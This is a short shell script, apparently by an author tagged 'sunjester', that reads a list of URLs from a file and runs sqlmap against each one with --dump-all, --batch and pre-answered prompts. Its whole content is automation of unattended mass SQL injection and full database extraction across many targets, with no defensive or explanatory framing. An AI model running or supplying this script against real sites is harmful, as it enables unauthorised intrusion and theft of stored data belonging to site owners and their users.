#!/bin/sh
#sunjester
#automating sqlmap
if [ -z $1 ];
then
	echo "specify a file"
	exit
fi

while IFS='' read -r line || [[ -n "$line" ]]; do
        sqlmap -u $line --dump-all --answers="follow=Y" --batch
done < "$1"
